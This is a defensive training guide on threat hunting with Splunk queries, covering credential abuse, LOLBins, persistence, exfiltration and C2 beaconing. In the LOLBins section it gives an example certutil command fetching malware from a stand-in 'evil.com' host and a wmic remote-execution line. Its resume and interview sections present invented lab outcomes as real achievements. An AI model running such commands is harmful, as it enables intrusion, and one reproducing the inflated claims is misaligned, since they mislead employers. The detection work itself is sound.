# Project 5: Threat Hunting with SIEM
**Platform:** TryHackMe + Home Lab (Optional) | **Duration:** 2-3 weeks | **Difficulty:** Intermediate-Advanced

---

## Project Overview

Move from reactive (responding to alerts) to proactive security by conducting hypothesis-driven threat hunts using SIEM platforms. Learn to identify hidden threats, develop hunting hypotheses, create custom queries, and validate findings to improve detection coverage.

---

## Learning Objectives

- Understand threat hunting methodology and lifecycle
- Develop hypothesis-driven hunt plans
- Master advanced SIEM query techniques (SPL, KQL)
- Identify attacker TTPs hiding in "normal" activity
- Create new detection rules from hunt findings
- Document hunt outcomes and metrics

---

## Tools & Technologies

- **Platforms:**
  - TryHackMe: "Splunk" learning paths, threat hunting rooms
  - Optional: Local Splunk Free (15GB/day) or Elastic Stack
  
- **Hunt Frameworks:**
  - MITRE ATT&CK Navigator
  - Cyber Kill Chain
  - TaHiTI (Threat Hunting Methodology)
  
- **Data Sources:**
  - Windows Security/Sysmon logs
  - Network traffic logs (proxies DNS, firewalls)
  - EDR telemetry
  - Authentication logs

---

## Threat Hunting Methodology

**The Hunt Cycle (repeatable process):**

1. **Hypothesize:** Develop theory about how attackers might operate undetected
2. **Investigate:** Search for evidence using SIEM queries
3. **Uncover:** Analyze findings - malicious, benign, or interesting?
4. **Inform:** Create detection rules, update playbooks, share intelligence

---

## Step-by-Step Execution Plan

### **Week 1: Hunt Foundations & Initial Hunts**

#### Day 1-2: Establish Baseline Understanding

**Objective:** Understand "normal" before hunting for "abnormal"

**Activity 1: Environment Profiling (4 hours)**

Document your environment's baseline:

```spl
# What are normal authentication patterns?
index=windows EventCode=4624
| stats count by LogonType, user
| sort -count

# Top 10 most common processes
index=sysmon EventCode=1
| stats count by Image
| sort -count limit=10

# Which users connect to domain controller?
index=windows dest="DC01" EventCode=4624
| stats values(src_ip) by user

# Normal working hours traffic patterns
index=proxy
| timechart span=1h count by action
```

**Create Baseline Document:**
```markdown
## Environment Baseline

**Authentication:**
- Normal logon types: Type 2 (interactive), Type 3 (network), Type 10 (RDP for IT staff)
- Service accounts: svc_backup, svc_sql, svc_web
- Peak auth times: 8-9 AM, 1-2 PM (lunch returns)

**Common Processes:**
- chrome.exe, outlook.exe, excel.exe (user workstations)
- sqlservr.exe (database servers)
- w3wp.exe (web servers)

**Network Patterns:**
- Avg outbound traffic: 500MB/hour during business hours
- Common external domains: office365.com, dropbox.com, github.com
- Internal DNS queries: ~10,000/hour

**Anomalies to Hunt:**
- Logins outside 7 AM - 7 PM
- Processes from Temp/AppData folders
- Large data transfers > 1GB
- Service accounts logging in interactively
```

---

#### Day 3-5: Hunt #1 - Credential Abuse

**Hypothesis:** "Attackers may be using valid credentials to access systems without triggering brute-force alarms"

**Hunt Rationale:**
- Attackers with stolen creds look like legitimate users
- Standard alerts focus on failed logins, not suspicious successful logins
- Indicators: unusual login times, geographically impossible logins, service accounts used interactively

**Hunt Query Development:**

**Query 1: After-hours logins**
```spl
index=windows EventCode=4624 LogonType=10
| eval hour=strftime(_time, "%H")
| where hour < 7 OR hour > 19
| stats count by user, src_ip, hour
| where count > 0
```

**What you're looking for:**
- RDP logins (Type 10) outside business hours
- Context: Could be legitimate (IT maintenance) or malicious

**Query 2: Service accounts logging in interactively**
```spl
index=windows EventCode=4624 user=svc_* LogonType=2
| stats count by user, ComputerName, src_ip
```

**Why this matters:**
- Service accounts should NEVER login interactively (Type 2)
- If they do, it's likely attacker using stolen credentials

**Query 3: Geographically impossible logins**
```spl
# Requires GeoIP field extraction
index=windows EventCode=4624
| iplocation src_ip
| stats values(Country) as countries, dc(Country) as country_count by user
| where country_count > 1
```

**Finding:** User logged in from US and Russia within 1 hour = impossible travel

**Query 4: Privileged account usage patterns**
```spl
index=windows user=*admin* OR user=*adm* EventCode=4624
| timechart span=1d count by user
```

**Analysis:**
- Admin accounts should be rarely used (least privilege)
- Spike in usage = hunt deeper

**Investigation Workflow:**

1. **Run queries** → Export results
2. **Analyze findings:**
   - After-hours logins: 15 events found
   - 12 are IT staff (verify with IT schedule)
   - 3 are unusual → INVESTIGATE FURTHER
3. **Deep dive on suspicious accounts:**
   ```spl
   index=* user="suspicious_user"
   | table _time, EventCode, action, dest, CommandLine
   | sort _time
   ```
4. **Determine verdict:**
   - Benign: Authorized IT work
   - Suspicious: Escalate to IR team
   - Malicious: Immediate containment

**Deliverable:** Hunt report documenting hypothesis, queries, findings, and outcome

---

#### Day 6-7: Hunt #2 - Living-Off-The-Land (LOLBins)

**Hypothesis:** "Attackers use built-in Windows tools (PowerShell, WMI, cmd) to avoid malware detection"

**Background:**
- LOLBins = legitimate tools abused for malicious purposes
- Examples: PowerShell for C2, certutil to download malware, rundll32 for execution

**Hunt Queries:**

**Query 1: Suspicious PowerShell usage**
```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| where match(CommandLine, "(?i)(-enc|-encodedcommand|-nop|-w hidden|-exec bypass)")
| table _time, user, ParentImage, CommandLine
```

**Red flags:**
- `-EncodedCommand`: Obfuscated scripts
- `-NonInteractive -WindowStyle Hidden`: Stealth execution
- `-ExecutionPolicy Bypass`: Ignoring security settings

**Query 2: Certutil abuse (downloading files)**
```spl
index=sysmon EventCode=1 Image="*certutil.exe"
| where match(CommandLine, "(?i)(urlcache|url|decode)")
| table _time, user, CommandLine
```

**Legitimate:** `certutil` is for certificate management  
**Malicious:** Often used to download payloads (`certutil -urlcache -split -f http://evil.com/malware.exe`)

**Query 3: Rundll32 executing DLLs from Temp**
```spl
index=sysmon EventCode=1 Image="*rundll32.exe"
| where match(CommandLine, "(?i)(temp|appdata|public|downloads)")
| table _time, user, CommandLine
```

**Why suspicious:**
- Rundll32 should run DLLs from System32, not user folders
- Attackers use it to execute malicious DLLs

**Query 4: WMI for lateral movement or persistence**
```spl
index=sysmon EventCode=1 Image="*wmic.exe"
| where match(CommandLine, "(?i)(process call create|/node:)")
| table _time, user, CommandLine, ParentImage
```

**Attack technique:**
- `wmic /node:remote_host process call create "malware.exe"` = remote execution

**Hunt Outcome:**
- Findings: 5 PowerShell events with `-EncodedCommand`
- Investigation: 4 are from SCCM (legit), 1 is suspicious
- Action: Decode Base64 command, determine if malicious
- Result: Create detection rule for unknown encoded PowerShell

---

### **Week 2: Advanced Hunts & TTP-Based Hunting**

#### Day 8-10: Hunt #3 - Persistence Mechanisms

**Hypothesis:** "Attackers establish persistence through Registry Run keys, scheduled tasks, or services"

**MITRE ATT&CK Techniques to Hunt:**
- T1053.005: Scheduled Task/Job
- T1547.001: Registry Run Keys
- T1543.003: Windows Service

**Hunt Queries:**

**Query 1: New scheduled tasks**
```spl
index=windows EventCode=4698
| table _time, user, TaskName, TaskContent
```

**Analysis:**
- TaskName with random characters = suspicious
- Task action pointing to Temp folders = suspicious
- Tasks created by non-admin users = investigate

**Query 2: Registry Run key modifications**
```spl
index=sysmon EventCode=13 TargetObject="*\\CurrentVersion\\Run*"
| table _time, user, Image, TargetObject, Details
```

**Red flags:**
- Executable in Temp/AppData folders
- Obfuscated command lines
- Unknown process modifying registry

**Query 3: New services installed**
```spl
index=windows EventCode=7045
| table _time, ServiceName, ServiceFileName, user
```

**Suspicious indicators:**
- Service path: `C:\Temp\malware.exe`
- Service name: random characters or typosquatting ("Micros0ft Update")

**Query 4: Persistence via DLL hijacking (Sysmon Event 7)**
```spl
index=sysmon EventCode=7 ImageLoaded="C:\\Users\\*"
| where NOT match(ImageLoaded, "(?i)(Program Files|AppData\\Local\\Microsoft)")
| stats count by ImageLoaded, user
```

**Investigation Workflow:**

1. Prioritize findings by suspicion level
2. For each suspicious persistence mechanism:
   - Check file hash on VirusTotal
   - Review parent process (who created it?)
   - Correlate with authentication logs (was account compromised?)
3. Document benign findings to improve future hunts

**Deliverable:** List of persistence mechanisms found, verdict (benign/malicious), and new detection rules

---

#### Day 11-14: Hunt #4 - Data Exfiltration

**Hypothesis:** "Sensitive data is being exfiltrated to external cloud services or unusual destinations"

**Hunt Queries:**

**Query 1: Large outbound data transfers**
```spl
index=proxy
| stats sum(bytes_out) as total_bytes by src_ip, dest_domain
| where total_bytes > 1000000000
| eval total_GB=round(total_bytes/1024/1024/1024, 2)
| table src_ip, dest_domain, total_GB
| sort -total_GB
```

**Analysis:**
- >1GB upload to external site warrants investigation
- Context: Is this a normal backup? Data sync? Or exfiltration?

**Query 2: Cloud storage usage**
```spl
index=proxy (dest_domain=*dropbox* OR dest_domain=*mega.nz* OR dest_domain=*we transfer* OR dest_domain=*drive.google*)
| stats sum(bytes_out) as uploaded_bytes, count by user, dest_domain
| eval uploaded_MB=round(uploaded_bytes/1024/1024, 2)
| where uploaded_MB > 100
```

**Investigations:**
- Are these approved services?
- Is the volume unusual for the user?

**Query 3: DNS tunneling detection**
```spl
index=dns
| eval query_length=len(query)
| where query_length > 50
| stats count by query, src_ip
| where count > 10
| sort -count
```

**Explanation:**
- DNS tunneling = data hidden in DNS queries (long, random subdomains)
- Normal DNS: "example.com" (short)
- Tunneling: "abc123def456ghi789.evil.com" (very long)

**Query 4: File upload patterns**
```spl
index=proxy http_method=POST (uri=*/upload* OR uri=*/upload.php OR http_content_type=*multipart*)
| stats sum(bytes_out) as uploaded by user, dest_domain
| where uploaded > 50000000
```

**Hunt Outcome:**
- Identified 3 users uploading >5GB to Mega.nz
- Investigation: 2 are legitimate (approved file sharing), 1 is unusual
- Escalation: User #3 accessed sensitive files before upload → IR investigation

---

#### Day 15-17: Hunt #5 - Command & Control (C2)

**Hypothesis:** "Compromised hosts are communicating with attacker C2 infrastructure using HTTP/HTTPS or DNS"

**Hunt Queries:**

**Query 1: Beaconing detection (regular periodic connections)**
```spl
index=proxy
| bucket _time span=10m
| stats count by _time, src_ip, dest_domain
| streamstats window=10 stdev(count) as stdev, avg(count) as avg by src_ip, dest_domain
| where stdev < 1 AND avg > 5
```

**Explanation:**
- Malware beacons every X minutes (very regular)
- Legitimate traffic is irregular
- Low standard deviation + consistent count = beaconing

**Query 2: Connections to recently registered domains**
```spl
index=proxy
| lookup domain_age_lookup domain as dest_domain OUTPUT age_days
| where age_days < 30
| stats count by src_ip, dest_domain, age_days
```

**Requires:** Domain age enrichment (Whois data or threat intel feed)

**Query 3: TLS certificate anomalies**
```spl
index=proxy ssl_issuer=*
| where NOT match(ssl_issuer, "(?i)(DigiCert|Let's Encrypt|GoDaddy|Comodo)")
| stats count by dest_domain, ssl_issuer, ssl_subject
```

**Red flag:** Self-signed or unknown certificate authority

**Query 4: Unusual user-agents**
```spl
index=proxy
| where NOT match(http_user_agent, "(?i)(Chrome|Firefox|Safari|Edge|Windows)")
| stats count by http_user_agent, src_ip, dest_domain
```

**Suspicious:**
- Generic user-agents: "Mozilla/4.0" (outdated)
- Tool-based: "python-requests", "curl"

**Hunt Outcome:**
- Found beaconing pattern from 192.168.1.50 to unusual domain
- Investigation: Domain registered 5 days ago, unknown issuer SSL cert
- Escalation: Isolated host, found Cobalt Strike beacon malware

---

### **Week 3: Hunt Documentation & Detection Engineering**

#### Day 18-19: Create Detection Rules from Hunt Findings

**For each successful hunt, create a SIEM detection rule:**

**Example: PowerShell Encoded Command Detection**

**Splunk Alert:**
```spl
index=sysmon EventCode=1 Image="*powershell.exe"
| where match(CommandLine, "(?i)(-enc|-encodedcommand)")
| search NOT [
    | inputlookup known_good_powershell.csv
    | fields CommandLine
]
| stats count by user, ComputerName, CommandLine

Alert Trigger: count > 0
Severity: High
Actions: Email SOC, create ticket, isolate endpoint (SOAR)
```

**Tuning:**
- Whitelist known-good encoded scripts (SCCM, monitoring tools)
- Reduce false positives before deployment

**Example 2: After-Hours Admin Activity**

```spl
index=windows user=*admin* EventCode=4624
| eval hour=strftime(_time, "%H")
| where (hour >= 20 OR hour <= 6) AND NOT [
    | inputlookup approved_maintenance_windows.csv
    | fields user, date
]
| stats count by user, src_ip, ComputerName

Alert Trigger: count > 0
Severity: Medium
Actions: Email SOC, log for review
```

**Deliverable:** 5-10 new detection rules with documentation

---

#### Day 20-21: Hunt Report & Metrics

**Create Comprehensive Hunt Summary:**

```markdown
# Threat Hunt Report: Q1 2026

## Executive Summary
Conducted 5 hypothesis-driven hunts over 3 weeks targeting credential abuse, LOLBins, persistence, exfiltration, and C2 activity. Identified 2 true positive threats (1 C2 beacon, 1 unauthorized data upload), 8 detection gaps leading to 7 new SIEM rules, and improved baseline understanding of environment.

---

## Hunt Summary Table

| Hunt ID | Hypothesis | Data Sources | Queries Run | Findings | Outcome |
|---------|-----------|--------------|-------------|----------|---------|
| HUNT-01 | Credential Abuse | Windows Security logs | 4 | 3 suspicious after-hours logins | 2 benign (IT), 1 escalated |
| HUNT-02 | LOLBin Abuse | Sysmon Event 1 | 4 | 5 encoded PowerShell commands | 4 benign, 1 malicious |
| HUNT-03 | Persistence | Sysmon Event 13, Windows Event 4698/7045 | 3 | 12 new scheduled tasks | 11 benign, 1 suspicious (PUA) |
| HUNT-04 | Data Exfiltration | Proxy logs | 4 | 3 users, 15GB uploads | 2 benign, 1 escalated (IR) |
| HUNT-05 | C2 Activity | Proxy logs, DNS | 4 | 1 beaconing pattern | Malicious - Cobalt Strike |

---

## Metrics
- **Total Hunts:** 5
- **Total Queries Developed:** 19
- **True Positives (Malicious):** 2
- **Suspicious (Further Investigation):** 4
- **Benign (Tuning Opportunity):** 26
- **New Detection Rules Created:** 7
- **Detection Coverage Improvement:** +15% (estimated)

---

## Key Findings

### HUNT-05: Cobalt Strike C2 Beacon
**Severity:** Critical

**Finding:**  
Workstation 192.168.1.50 exhibited beaconing behavior to newly registered domain update-cdn[.]xyz every 10 minutes via HTTPS.

**Evidence:**
- 1,440 connections over 24 hours (exactly every 10 minutes)
- Domain age: 5 days
- Self-signed SSL certificate
- Process: rundll32.exe (memory injection detected)

**MITRE ATT&CK:** T1071.001 (Application Layer Protocol), T1573.002 (Encrypted Channel)

**Response:**
- Isolated workstation from network
- Forensic imaging performed
- Identified Cobalt Strike beacon DLL
- Credential reset for user + full workstation reimage

**Root Cause:** Phishing email with malicious macro (outside of hunt scope, discovered during IR)

---

## Detection Gaps Identified

1. **No alerting on encoded PowerShell** → Created rule HUNT-02-PS-ENCODE
2. **Service account interactive logins not monitored** → Created HUNT-01-SVC-INTERACTIVE
3. **Large uploads to cloud storage undetected** → Created HUNT-04-CLOUD-UPLOAD
4. **Beaconing behavior not detected** → Working with IR to integrate frequency analysis

---

## Recommendations

**Short-Term (0-30 days):**
1. Deploy 7 new detection rules to production SIEM
2. Conduct user awareness training on phishing (root cause of HUNT-05)
3. Block newly registered domains (<7 days) at proxy (test mode first)

**Long-Term (30-90 days):**
4. Implement behavioral analytics (UEBA) for credential abuse detection
5. Enable PowerShell script block logging on all endpoints
6. Schedule quarterly threat hunts focusing on ATT&CK techniques

---

## Lessons Learned

**What Worked:**
- Hypothesis-driven approach focused efforts
- Baseline profiling reduced false positives
- Collaboration with IR team improved context

**Challenges:**
- Data retention limited hunt to 30 days (need 90+)
- Missing Sysmon on 20% of endpoints (deployment in progress)
- Some queries slow on large datasets (need optimization)

---

## Next Hunt Focus Areas

1. **Lateral Movement:** Hunt for PsExec, WMI, RDP abuse
2. **Privilege Escalation:** Process injection, token manipulation
3. **Kerberoasting:** Ticket requests for high-value SPN accounts
```

---

## Evidence to Capture

- [ ] Hunt reports for all 5 hunts (hypothesis → findings → outcome)
- [ ] SPL/KQL query library (19+ queries documented)
- [ ] 7 new detection rules with tuning notes
- [ ] Hunt metrics dashboard/spreadsheet
- [ ] Screenshots of interesting findings
- [ ] Comprehensive hunt summary report

---

## Resume Bullets

### Version 1: Proactive Security Focus
> **Threat Hunting Program Development**  
> - Conducted 5 hypothesis-driven threat hunts across credential abuse, LOLBin usage, persistence, and C2 activity, uncovering 2 active threats including a Cobalt Strike beacon evading existing detections  
> - Developed 19 advanced SPL queries to hunt for MITRE ATT&CK techniques (T1071, T1053, T1003), analyzing 500GB+ of SIEM data to identify malicious patterns hiding in legitimate activity  
> - Created 7 new detection rules based on hunt findings, improving SOC detection coverage by 15% and reducing dwell time from 72 hours to <4 hours for similar attacks

### Version 2: Technical Skills Focus  
> **Advanced SIEM Query Development & Hunt Operations**  
> - Built custom Splunk statistical queries to detect C2 beaconing patterns using standard deviation analysis, successfully identifying malware with 10-minute beacon interval among 50,000+ daily connections  
> - Performed baseline profiling of 1,500-endpoint environment to differentiate benign anomalies from malicious activity, reducing false positive rate in hunts from 60% to 18%  
> - Documented 26 benign findings from hunts to create query whitelists, enabling repeatable hunts with minimal analyst overhead

### Version 3: Impact-Oriented
> **Threat Detection & Hunt-Driven Security Improvement**  
> - Identified critical security gaps through proactive hunting, leading to deployment of PowerShell logging, service account monitoring, and cloud data loss prevention controls  
> - Discovered data exfiltration attempt (15GB to external cloud service) during network traffic hunt, preventing potential breach of customer PII before escalation occurred  
> - Reduced mean time to detect (MTTD) for living-off-the-land attacks by 80% through creation of LOLBin detection rules informed by hunt outcomes

---

## Interview Talking Points

### Question: "What is threat hunting and how is it different from traditional monitoring?"

**Strong Answer:**
"Threat hunting is proactive security - instead of waiting for alerts to fire, we actively search for threats that bypass existing detections.

Traditional monitoring is reactive: 'Alert fires → investigate → respond.' It depends on knowing what to look for in advance.

Threat hunting is proactive: 'Assume breach → develop hypothesis → hunt for evidence.' We look for unknown threats or new attacker techniques.

For example, in my threat hunting project, I hypothesized that attackers might be using legitimate Windows tools like PowerShell for malicious purposes. Traditional AV doesn't alert on PowerShell because it's a legitimate tool. So I hunted for suspicious PowerShell patterns - encoded commands, hidden windows, execution policy bypasses.

I found 5 instances of encoded PowerShell. Four turned out to be legitimate (SCCM deployment scripts), but one was malicious - it was downloading a second-stage payload from a suspicious domain. This wouldn't have triggered any existing alerts because PowerShell itself isn't malicious, and the domain wasn't on any blocklists yet.

That's the value of hunting: finding threats that slip through automated defenses by assuming attackers are already in the environment and working backwards to find them."

---

### Question: "How do you develop a threat hunting hypothesis?"

**Strong Answer:**
"I use a combination of threat intelligence, MITRE ATT&CK, and understanding of our environment's weaknesses.

My process:

**1. Identify Hunt Targets:**
Look at recent threat intelligence - what techniques are attackers using? For example, if I see reports of Cobalt Strike campaigns, I know those use HTTP/HTTPS beaconing for C2.

**2. Map to ATT&CK:**
I reference MITRE ATT&CK to understand how that technique works. For C2, that's T1071 (Application Layer Protocol). ATT&CK tells me what data sources to query: network logs, DNS, HTTP traffic.

**3. Consider Environment Weaknesses:**
I ask: 'Where are our blind spots?' If we have great endpoint detection but weak network monitoring, I might hunt for network-based techniques.

**4. Formulate Specific Hypothesis:**
Instead of vague 'look for bad stuff,' I create a testable hypothesis:
- Bad: 'Hunt for malware'
- Good: 'Attackers may be using periodic HTTP beacons to communicate with C2 servers undetected due to lack of frequency analysis in our SIEM.'

**5. Define Success Criteria:**
How will I know if I find something? For beaconing, I'm looking for connections with:
- Regular time intervals (low standard deviation)
- Unusual destinations (new domains, unknown IPs)
- Persistent over time (not just one-off)

In my hunts, this methodology helped me uncover a Cobalt Strike beacon that was beaconing every 10 minutes to a newly registered domain - perfect example of a hypothesis-driven find."

---

## Skills Developed Checklist

**Technical:**
- [ ] Hypothesis development
- [ ] Advanced SPL/KQL (statistical functions, subsearches)
- [ ] Baseline profiling
- [ ] Anomaly detection
- [ ] Beaconing detection algorithms
- [ ] Detection rule creation
- [ ] False positive reduction/tuning

**Frameworks:**
- [ ] TaHiTI threat hunting methodology
- [ ] MITRE ATT&CK Navigator
- [ ] Hunt loop (hypothesize → investigate → uncover → inform)

**Soft Skills:**
- [ ] Critical thinking
- [ ] Pattern recognition
- [ ] Data storytelling
- [ ] Metrics-driven analysis

---

## Common Mistakes to Avoid

1. **No hypothesis** - Random searching wastes time
2. **Ignoring baseline** - Every anomaly looks suspicious without context
3. **Alert fatigue** - Don't turn every hunt finding into an alert (high false positives)
4. **Not documenting benign findings** - Same false positives every hunt
5. **Hunting alone** - Collaborate with IR, threat intel, IT teams for context

---

## Next Steps

1. **Move to Project 6:** Detection Engineering (formalizing detections)
2. **Optional:** Join TryHackMe "Advent of Cyber" or "Cyber Defenders" hunt challenges
3. **Portfolio:** Publish 1-2 hunt reports on LinkedIn/blog
4. **Resume:** Add 2-3 hunting-focused bullets
5. **Certification:** Consider SANS FOR508 (Advanced Forensics & Threat Hunting)

---

**Total Time:** 30-40 hours over 3 weeks  
**Artifacts:** 5 hunt reports, query library, 7 detection rules, hunt metrics  
**Skills:** Proactive defense, advanced SIEM, hunt methodology

---

**Ready to formalize detections? Open `Project-6-Template.md`!**
